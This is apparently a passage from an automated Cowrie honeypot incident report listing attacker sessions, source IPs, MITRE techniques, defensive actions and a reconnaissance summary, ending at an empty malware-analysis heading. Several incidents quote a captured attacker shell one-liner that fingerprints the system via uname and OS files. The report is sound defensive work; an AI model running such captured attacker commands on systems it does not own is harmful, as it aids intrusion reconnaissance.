| `2026-07-31 08:25:44` | `cowrie.client.kex` |
| `2026-07-31 08:25:45` | `cowrie.login.success` |
| `2026-07-31 08:25:46` | `cowrie.session.params` |
| `2026-07-31 08:25:46` | `cowrie.command.input` |
| `2026-07-31 08:25:46` | `cowrie.command.input` |
| `2026-07-31 08:25:46` | `cowrie.command.input` |
| `2026-07-31 08:25:46` | `cowrie.command.input` |
| `2026-07-31 08:25:46` | `cowrie.command.input` |
| `2026-07-31 08:25:46` | `cowrie.command.success` |
| `2026-07-31 08:25:46` | `cowrie.command.input` |
| `2026-07-31 08:25:46` | `cowrie.command.input` |
| `2026-07-31 08:25:46` | `cowrie.command.input` |
| `2026-07-31 08:25:46` | `cowrie.command.input` |
| `2026-07-31 08:25:46` | `cowrie.log.closed` |
| `2026-07-31 08:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7c1b6ab2d10

| Field | Detail |
|---|---|
| **Source IP** | `59.48.40[.]6` |
| **First Seen** | 2026-07-31 08:29 |
| **Last Seen** | 2026-07-31 08:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:29:15` | `cowrie.session.connect` |
| `2026-07-31 08:29:16` | `cowrie.client.version` |
| `2026-07-31 08:29:16` | `cowrie.client.kex` |
| `2026-07-31 08:29:19` | `cowrie.login.success` |
| `2026-07-31 08:29:20` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.48.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `59.48.40[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d0bc5da3d2

| Field | Detail |
|---|---|
| **Source IP** | `176.36.139[.]231` |
| **First Seen** | 2026-07-31 08:29 |
| **Last Seen** | 2026-07-31 08:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:29:27` | `cowrie.session.connect` |
| `2026-07-31 08:29:27` | `cowrie.client.version` |
| `2026-07-31 08:29:27` | `cowrie.client.kex` |
| `2026-07-31 08:29:29` | `cowrie.login.success` |
| `2026-07-31 08:29:29` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.36.139[.]231` to AbuseIPDB if not already reported
- [ ] Block `176.36.139[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc2b5f63ab34

| Field | Detail |
|---|---|
| **Source IP** | `218.248.19[.]102` |
| **First Seen** | 2026-07-31 08:29 |
| **Last Seen** | 2026-07-31 08:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:29:31` | `cowrie.session.connect` |
| `2026-07-31 08:29:31` | `cowrie.client.version` |
| `2026-07-31 08:29:31` | `cowrie.client.kex` |
| `2026-07-31 08:29:33` | `cowrie.login.success` |
| `2026-07-31 08:29:34` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:29:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.248.19[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.248.19[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f37de4d9cba6

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-07-31 08:29 |
| **Last Seen** | 2026-07-31 08:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:29:34` | `cowrie.session.connect` |
| `2026-07-31 08:29:35` | `cowrie.client.version` |
| `2026-07-31 08:29:35` | `cowrie.client.kex` |
| `2026-07-31 08:29:37` | `cowrie.login.success` |
| `2026-07-31 08:29:37` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7c2456d6fdb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 08:31 |
| **Last Seen** | 2026-07-31 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:31:28` | `cowrie.session.connect` |
| `2026-07-31 08:31:28` | `cowrie.client.version` |
| `2026-07-31 08:31:28` | `cowrie.client.kex` |
| `2026-07-31 08:31:28` | `cowrie.login.success` |
| `2026-07-31 08:31:29` | `cowrie.session.params` |
| `2026-07-31 08:31:29` | `cowrie.command.input` |
| `2026-07-31 08:31:29` | `cowrie.command.input` |
| `2026-07-31 08:31:29` | `cowrie.command.input` |
| `2026-07-31 08:31:29` | `cowrie.command.input` |
| `2026-07-31 08:31:29` | `cowrie.command.input` |
| `2026-07-31 08:31:29` | `cowrie.command.success` |
| `2026-07-31 08:31:29` | `cowrie.command.input` |
| `2026-07-31 08:31:29` | `cowrie.command.input` |
| `2026-07-31 08:31:29` | `cowrie.command.input` |
| `2026-07-31 08:31:29` | `cowrie.command.input` |
| `2026-07-31 08:31:29` | `cowrie.log.closed` |
| `2026-07-31 08:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-333991f9b30f

| Field | Detail |
|---|---|
| **Source IP** | `213.234.9[.]218` |
| **First Seen** | 2026-07-31 08:33 |
| **Last Seen** | 2026-07-31 08:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:33:17` | `cowrie.session.connect` |
| `2026-07-31 08:33:18` | `cowrie.client.version` |
| `2026-07-31 08:33:18` | `cowrie.client.kex` |
| `2026-07-31 08:33:19` | `cowrie.login.success` |
| `2026-07-31 08:33:19` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.234.9[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.234.9[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-add2cae0e1c8

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]234` |
| **First Seen** | 2026-07-31 08:33 |
| **Last Seen** | 2026-07-31 08:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:33:29` | `cowrie.session.connect` |
| `2026-07-31 08:33:30` | `cowrie.client.version` |
| `2026-07-31 08:33:30` | `cowrie.client.kex` |
| `2026-07-31 08:33:32` | `cowrie.login.success` |
| `2026-07-31 08:33:32` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]234` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3061866fd42a

| Field | Detail |
|---|---|
| **Source IP** | `65.20.211[.]96` |
| **First Seen** | 2026-07-31 08:38 |
| **Last Seen** | 2026-07-31 08:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:38:54` | `cowrie.session.connect` |
| `2026-07-31 08:38:54` | `cowrie.client.version` |
| `2026-07-31 08:38:54` | `cowrie.client.kex` |
| `2026-07-31 08:38:55` | `cowrie.login.success` |
| `2026-07-31 08:38:56` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.211[.]96` to AbuseIPDB if not already reported
- [ ] Block `65.20.211[.]96` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-420f56e7479f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 08:41 |
| **Last Seen** | 2026-07-31 08:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:41:15` | `cowrie.session.connect` |
| `2026-07-31 08:41:16` | `cowrie.client.version` |
| `2026-07-31 08:41:16` | `cowrie.client.kex` |
| `2026-07-31 08:41:17` | `cowrie.login.success` |
| `2026-07-31 08:41:18` | `cowrie.session.params` |
| `2026-07-31 08:41:18` | `cowrie.command.input` |
| `2026-07-31 08:41:18` | `cowrie.command.input` |
| `2026-07-31 08:41:18` | `cowrie.command.input` |
| `2026-07-31 08:41:18` | `cowrie.command.input` |
| `2026-07-31 08:41:18` | `cowrie.command.input` |
| `2026-07-31 08:41:18` | `cowrie.command.success` |
| `2026-07-31 08:41:18` | `cowrie.command.input` |
| `2026-07-31 08:41:18` | `cowrie.command.input` |
| `2026-07-31 08:41:18` | `cowrie.command.input` |
| `2026-07-31 08:41:18` | `cowrie.command.input` |
| `2026-07-31 08:41:18` | `cowrie.log.closed` |
| `2026-07-31 08:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b4d61e902aa

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 08:44 |
| **Last Seen** | 2026-07-31 08:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:44:36` | `cowrie.session.connect` |
| `2026-07-31 08:44:36` | `cowrie.client.version` |
| `2026-07-31 08:44:36` | `cowrie.client.kex` |
| `2026-07-31 08:44:37` | `cowrie.login.success` |
| `2026-07-31 08:44:38` | `cowrie.session.params` |
| `2026-07-31 08:44:38` | `cowrie.command.input` |
| `2026-07-31 08:44:38` | `cowrie.command.input` |
| `2026-07-31 08:44:38` | `cowrie.command.input` |
| `2026-07-31 08:44:38` | `cowrie.command.input` |
| `2026-07-31 08:44:38` | `cowrie.command.input` |
| `2026-07-31 08:44:38` | `cowrie.command.success` |
| `2026-07-31 08:44:38` | `cowrie.command.input` |
| `2026-07-31 08:44:38` | `cowrie.command.input` |
| `2026-07-31 08:44:38` | `cowrie.command.input` |
| `2026-07-31 08:44:38` | `cowrie.command.input` |
| `2026-07-31 08:44:38` | `cowrie.log.closed` |
| `2026-07-31 08:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e8bd28ed82f

| Field | Detail |
|---|---|
| **Source IP** | `219.128.15[.]190` |
| **First Seen** | 2026-07-31 08:45 |
| **Last Seen** | 2026-07-31 08:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:45:37` | `cowrie.session.connect` |
| `2026-07-31 08:45:37` | `cowrie.client.version` |
| `2026-07-31 08:45:37` | `cowrie.client.kex` |
| `2026-07-31 08:45:40` | `cowrie.login.success` |
| `2026-07-31 08:45:42` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.128.15[.]190` to AbuseIPDB if not already reported
- [ ] Block `219.128.15[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca37ceb2140

| Field | Detail |
|---|---|
| **Source IP** | `216.232.226[.]40` |
| **First Seen** | 2026-07-31 08:45 |
| **Last Seen** | 2026-07-31 08:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:45:47` | `cowrie.session.connect` |
| `2026-07-31 08:45:47` | `cowrie.client.version` |
| `2026-07-31 08:45:47` | `cowrie.client.kex` |
| `2026-07-31 08:45:49` | `cowrie.login.success` |
| `2026-07-31 08:45:49` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.232.226[.]40` to AbuseIPDB if not already reported
- [ ] Block `216.232.226[.]40` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50751fc79a74

| Field | Detail |
|---|---|
| **Source IP** | `222.75.225[.]206` |
| **First Seen** | 2026-07-31 08:47 |
| **Last Seen** | 2026-07-31 08:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:47:59` | `cowrie.session.connect` |
| `2026-07-31 08:48:00` | `cowrie.client.version` |
| `2026-07-31 08:48:00` | `cowrie.client.kex` |
| `2026-07-31 08:48:03` | `cowrie.login.success` |
| `2026-07-31 08:48:04` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:48:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.75.225[.]206` to AbuseIPDB if not already reported
- [ ] Block `222.75.225[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24338bf459f0

| Field | Detail |
|---|---|
| **Source IP** | `188.219.104[.]210` |
| **First Seen** | 2026-07-31 08:48 |
| **Last Seen** | 2026-07-31 08:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:48:10` | `cowrie.session.connect` |
| `2026-07-31 08:48:10` | `cowrie.client.version` |
| `2026-07-31 08:48:10` | `cowrie.client.kex` |
| `2026-07-31 08:48:11` | `cowrie.login.success` |
| `2026-07-31 08:48:11` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.219.104[.]210` to AbuseIPDB if not already reported
- [ ] Block `188.219.104[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aead9ed3ed56

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-31 08:50 |
| **Last Seen** | 2026-07-31 08:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:50:08` | `cowrie.session.connect` |
| `2026-07-31 08:50:08` | `cowrie.client.version` |
| `2026-07-31 08:50:08` | `cowrie.client.kex` |
| `2026-07-31 08:50:08` | `cowrie.login.success` |
| `2026-07-31 08:50:08` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:50:09` | `cowrie.direct-tcpip.ja4` |
| `2026-07-31 08:50:09` | `cowrie.direct-tcpip.data` |
| `2026-07-31 08:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7751fc9e124

| Field | Detail |
|---|---|
| **Source IP** | `223.197.145[.]33` |
| **First Seen** | 2026-07-31 08:53 |
| **Last Seen** | 2026-07-31 08:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 08:53:24` | `cowrie.session.connect` |
| `2026-07-31 08:53:24` | `cowrie.client.version` |
| `2026-07-31 08:53:24` | `cowrie.client.kex` |
| `2026-07-31 08:53:27` | `cowrie.login.success` |
| `2026-07-31 08:53:28` | `cowrie.direct-tcpip.request` |
| `2026-07-31 08:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.145[.]33` to AbuseIPDB if not already reported
- [ ] Block `223.197.145[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **41** | 2026-07-31 04:55 | 2026-07-31 08:50 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.151[.]21` | **30** | 2026-07-31 06:07 | 2026-07-31 06:07 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `34.140.177[.]161` | **30** | 2026-07-31 05:16 | 2026-07-31 05:17 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-31 05:20 | 2026-07-31 08:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **6** | 2026-07-31 06:18 | 2026-07-31 06:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **4** | 2026-07-31 05:37 | 2026-07-31 08:35 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-31 07:41 | 2026-07-31 07:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-07-31 08:01 | 2026-07-31 08:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-07-31 05:25 | 2026-07-31 05:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]129` | **3** | 2026-07-31 07:58 | 2026-07-31 07:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]41` | **3** | 2026-07-31 07:58 | 2026-07-31 07:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]224` | **3** | 2026-07-31 07:59 | 2026-07-31 08:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]121` | **3** | 2026-07-31 05:09 | 2026-07-31 05:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.75.9[.]241` | **2** | 2026-07-31 06:45 | 2026-07-31 06:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]86` | **2** | 2026-07-31 07:26 | 2026-07-31 07:28 | 4m | 0 | `T1592` | 🟢 LOW |
| `172.174.244[.]235` | **2** | 2026-07-31 07:42 | 2026-07-31 07:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-31 08:37 | 2026-07-31 08:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]161` | **2** | 2026-07-31 07:18 | 2026-07-31 07:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.122.244[.]225` | **2** | 2026-07-31 08:51 | 2026-07-31 08:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | **2** | 2026-07-31 06:42 | 2026-07-31 07:13 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.45.29[.]88` | 1 | 2026-07-31 07:08 | 2026-07-31 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.229.25[.]10` | 1 | 2026-07-31 07:24 | 2026-07-31 07:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-07-31 06:32 | 2026-07-31 06:33 | 42s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-07-31 06:36 | 2026-07-31 06:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.10.203[.]54` | 1 | 2026-07-31 08:03 | 2026-07-31 08:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.120.96[.]20` | 1 | 2026-07-31 05:11 | 2026-07-31 05:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `183.171.11[.]79` | 1 | 2026-07-31 07:31 | 2026-07-31 07:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-31 07:37 | 2026-07-31 07:38 | 35s | 0 | `T1592` | 🟢 LOW |
| `213.209.159[.]142` | 1 | 2026-07-31 07:39 | 2026-07-31 07:39 | 10s | 0 | `T1592` | 🟢 LOW |
| `218.21.243[.]58` | 1 | 2026-07-31 08:38 | 2026-07-31 08:38 | 9s | 0 | `T1592` | 🟢 LOW |
| `39.164.91[.]67` | 1 | 2026-07-31 06:17 | 2026-07-31 06:17 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-07-31 07:11 | 2026-07-31 07:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-07-31 06:26 | 2026-07-31 06:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-07-31 05:38 | 2026-07-31 05:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-07-31 08:41 | 2026-07-31 08:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]44` | 1 | 2026-07-31 06:39 | 2026-07-31 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-07-31 06:36 | 2026-07-31 06:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.205.196[.]2` | 1 | 2026-07-31 08:23 | 2026-07-31 08:23 | 13s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]24` | 1 | 2026-07-31 07:29 | 2026-07-31 07:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-31 05:50 | 2026-07-31 05:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.167.38[.]71` | 1 | 2026-07-31 06:28 | 2026-07-31 06:29 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]91` | 1 | 2026-07-31 05:39 | 2026-07-31 05:39 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

